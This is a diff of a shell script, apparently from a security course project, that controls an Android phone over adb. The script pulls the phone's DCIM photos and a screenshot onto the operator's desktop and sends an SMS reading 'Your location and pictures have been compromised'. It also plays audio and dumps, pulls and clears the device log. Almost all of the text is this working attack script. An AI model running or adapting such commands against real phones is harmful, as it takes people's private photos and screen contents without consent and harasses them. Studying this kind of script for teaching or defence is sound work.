@@ -13,6 +13,7 @@ do
 				sleep 4s			
 				
 				# flush log
+				adb shell rm /sdcard/attacklog.txt
 				adb shell logcat -c
 
 				# copy contents of DCIM from phone to desktop/output
@@ -29,21 +30,18 @@ do
 				$SLEEP
 				adb shell input tap 445 760
 				$SLEEP		
-
 				# take screenshot
 				adb shell screencap -p /sdcard/screen.png
 				$SLEEP
 				adb pull /sdcard/screen.png /home/cs5231/Desktop/
 				adb shell rm /sdcard/screen.png
-			
+ 
 				# sms
 				adb shell am start -a android.intent.action.SENDTO -d sms:101010101010 --es sms_body "Your location and pictures have been compromised" 
 				$SLEEP
-
-				# play music
+				# play music				
 				adb shell am start -a android.intent.action.VIEW -d file:///storage/sdcard0/Music/play.mp3 -t audio/mp3
 				$SLEEP
-				
 				# dump and pull log
 				adb shell logcat -v raw -f /sdcard/attacklog.txt -d
 				adb pull /sdcard/attacklog.txt /home/cs5231/Desktop/attacklog.txt
